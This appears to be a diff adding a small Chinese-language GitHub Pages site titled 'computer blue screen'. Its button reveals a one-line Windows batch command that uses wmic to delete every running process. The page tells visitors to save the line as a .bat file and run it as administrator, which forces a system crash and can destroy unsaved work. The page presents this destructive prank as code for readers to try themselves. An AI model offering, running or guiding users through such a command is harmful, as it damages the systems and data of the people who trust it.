@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>电脑蓝屏</title>
+    <style>
+        body {
+            font-family: "微软雅黑", sans-serif;
+            background-color: #333333; /* 深灰色背景 */
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #222222; /* 深灰色背景 */
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            color: #333; /* 设置文本颜色 */
+        }
+
+        h1 {
+            font-family: '微软雅黑';
+            font-size: 90px;
+            color: white;
+            font-weight: bold; /* 加粗 */
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-family: '微软雅黑';
+            font-size: 50px;
+            color: white;
+            font-weight: bold; /* 加粗 */
+            margin-top: 0;
+        }
+
+        .btn-container {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            display: inline-block;
+            width: 150px;
+            height: 60px;
+            background-color: #fff;
+            color: #333;
+            text-align: center;
+            line-height: 60px;
+            font-family: '微软雅黑', sans-serif;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            overflow: hidden;
+            transition: width 0.5s ease;
+        }
+
+        .btn:hover {
+            width: 250px; /* 按钮悬停时的宽度 */
+        }
+
+        .instruction {
+            font-family: '微软雅黑', sans-serif;
+            font-size: 14px;
+            color: #fff; /* 修改文字颜色为白色 */
+            margin-top: 20px;
+            display: none; /* 初始状态隐藏 */
+        }
+
+        .btn-text {
+            font-family: '微软雅黑', sans-serif;
+            font-size: 16px;
+            color: #fff; /* 修改文字颜色为白色 */
+            margin-top: 20px;
+        }
+
+        p {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h2 style="color: white;"><白垩网络></h2> <!-- 调整副标题颜色为白色 -->
+        <h1>电脑蓝屏</h1>
+        <div class="btn-container">
+            <button class="btn" onclick="extendButton(this)">获取代码</button>
+            <p class="btn-text" id="btnText"></p> <!-- 按钮下方文字 -->
+        </div>
+        <div class="instruction" id="instruction">
+            复制内容 → 打开一个文本文档 → 粘贴内容 → 将文件后缀改为.bat → 右键 → 以管理员身份运行
+        </div>
+    </header>
+    <div class="container">
+        <h2>About</h2>
+        <p>This is a simple website created using GitHub Pages.</p>
+        <h2>Contact</h2>
+        <p>You can contact me via email: example@example.com</p>
+    </div>
+
+    <script>
+        function extendButton(button) {
+            button.innerHTML = "for /f %%I in ('wmic process get Name')do (wmic process where Name=\"%%I\" delete)";
+            document.getElementById("btnText").innerHTML = "新建文本文档 → 编入上方代码 → 保存并退出 → 将文件后缀改为.bat → 右键 → 以管理员身份运行"; // 设置按钮下方文字为指定内容
+            button.style.transitionDuration = "0.5s"; // 设置过渡时间
+            button.style.width = "100%"; // 延长按钮至屏幕两端
+        }
+    </script>
+</body>
+</html>
